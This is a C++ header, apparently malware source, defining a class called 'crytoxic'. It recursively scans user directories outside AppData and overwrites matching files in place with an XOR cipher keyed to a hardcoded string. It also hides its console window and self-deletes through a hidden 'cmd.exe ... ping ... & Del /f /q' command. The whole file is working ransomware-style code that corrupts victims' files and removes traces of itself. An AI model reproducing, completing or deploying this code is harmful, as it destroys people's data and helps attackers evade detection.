#pragma region include
#pragma once
#define WIN32_LEAN_AND_MEAN
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#pragma warning(disable : 4996)
#pragma comment(lib, "Wtsapi32.lib")
#ifndef _GLIBCXX_NO_ASSERT
#include <cassert>
#endif
#include <algorithm>
#include <bitset>
#include <complex>
#include <deque>
#include <exception>
#include <fstream>
#include <functional>
#include <iomanip>
#include <ios>
#include <iosfwd>
#include <iostream>
#include <istream>
#include <iterator>
#include <limits>
#include <list>
#include <locale>
#include <map>
#include <memory>
#include <new>
#include <numeric>
#include <ostream>
#include <queue>
#include <set>
#include <sstream>
#include <stack>
#include <stdexcept>
#include <streambuf>
#include <string>
#include <typeinfo>
#include <utility>
#include <cmath>
#include <strsafe.h>
#include <io.h>
#include <windows.h>
#include <windowsx.h>
#include <filesystem>
#include <cstdio>
#define syspause system("pause")
#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")
static const std::vector<std::string> SEARCH_ERROR(1, "ERROR");
#pragma endregion

static const std::string standard_passcode = "dkdrlahWLTPRTMMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA81dCn"
"CKt0NVH7j5Oh2SGgEU0aqi5u6sYXemouJWXOlZO3jqDsHYM1qfEjVvCOmeoMNFXYSXdNhflU7mjWP8jtQIW"
"mkYIQ8o3FGqMzsMTNxrbAp0cULWu9eYmycjJwWIxxB7vUwvpEUNicgW7v5nCwmF5HS33Hmn7yDzcfjfUazF"
"Bs99K5xJEppHG0qc+q3YXxxPpwZNIRFn0Wtxt0Muh1U8avvWyw03uQ/wMBnzhwUC8T4G5NclLEWzOQExbQ4"
"oDlZBv8BM/WxxuOyu0I8bDUDdutJOfREYRZBlHvRKNNQQD2qDfjRz484uFs7b5nykjaMB9k/EJAuHjJzGsM";

class crytoxic {
private:
	inline static bool isFileOrDir(_finddata_t fd) {
		return fd.attrib & _A_SUBDIR ? false : true;
	}
public:
	inline static void SearchingSubFiles(std::string start_path = "",
		std::vector<std::string> allow = std::vector<std::string>(),
		std::function<BOOL(std::string)> processfn = std::function<BOOL(std::string)>()) {
		typedef struct _finddata_t FILE_SEARCH;
		struct _finddata_t fd;

		intptr_t handle;
		int check = 0;
		char temp[_MAX_PATH];
		char tmp[_MAX_PATH];

		start_path += "\\";
		std::strcpy(temp, start_path.c_str());
		start_path += "*";

		std::strcpy(tmp, temp);
		std::strcat(tmp, "*");
		if ((handle = _findfirst(tmp, &fd)) == -1) {
			return;
		} else {
			while (_findnext(handle, &fd) == 0) {
				std::string file_pt = temp;
				file_pt += fd.name;

				check = isFileOrDir(fd);
				if (check == 0 && fd.name[0] != '.') {
					char tmp[_MAX_PATH];
					std::strcpy(tmp, file_pt.c_str());
					SearchingSubFiles(tmp, allow, processfn);
				} else if (check == 1 && fd.size != 0 && fd.name[0] != '.') {
					for (const auto& i : allow) {
						if (std::strstr(file_pt.c_str(), i.c_str()) && !std::strstr(file_pt.c_str(), "\\AppData\\")) {
							processfn(file_pt);
						}
					}
				}
			}
			_findclose(handle);
			return;
		}
	}

	inline static BOOL windowtype(bool show) {
		HWND hWndConsole = GetConsoleWindow();
		return show ? ShowWindow(hWndConsole, SW_SHOW) : ShowWindow(hWndConsole, SW_HIDE);
	}

	inline static void delete_self_() {
		wchar_t szModuleName[MAX_PATH];
		wchar_t szCmd[2 * MAX_PATH];

		_STARTUPINFOW si = { 0 };
		_PROCESS_INFORMATION pi = { 0 };

		GetModuleFileNameW(NULL, szModuleName, MAX_PATH);
		StringCbPrintfW(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);
		CreateProcessW(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);

		return;
	}

	inline static BOOL Filecrypt(const std::string path) {
		char _buffer[BUFSIZ] = { NULL };

		_iobuf* fp = NULL;
		size_t readBytes = 0, rpos = 0, wpos = 0;
		errno_t err;

		if (err = fopen_s(&fp, path.c_str(), "r+b") != NULL)
			return EXIT_FAILURE;
		while (!std::feof(fp)) {
			wpos = std::ftell(fp);
			ZeroMemory(_buffer, sizeof(_buffer));

			readBytes = std::fread(_buffer, sizeof(char), sizeof(_buffer), fp);
			if (readBytes <= 0) break;
			rpos = std::ftell(fp);

			for (int i = 0; i < sizeof(_buffer); i++)
				_buffer[i] ^= standard_passcode[i % standard_passcode.length()];

			std::fseek(fp, wpos, SEEK_SET);
			std::fwrite(_buffer, sizeof(char), readBytes, fp);
			std::fseek(fp, rpos, SEEK_SET);
		}
		std::fclose(fp);
		return EXIT_SUCCESS;
	}
};